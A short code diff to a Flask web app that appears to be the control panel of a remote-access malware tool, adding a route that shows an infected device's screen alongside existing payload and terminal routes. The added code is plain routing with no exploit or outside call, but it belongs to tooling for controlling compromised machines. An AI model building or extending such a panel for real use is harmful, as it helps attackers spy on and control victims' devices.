@@ -22,6 +22,14 @@ def upload():
 def payload():
     return render_template("payload.html")
 
+@app.route("/screen/<path:path>")
+def screen(path):
+    devices = malware.list_devices()
+    if path in devices:
+        return render_template("screen.html")
+    else:
+        return redirect('/')
+
 @app.route('/terminal/<path:path>')
 def terminal(path):
     devices = malware.list_devices()
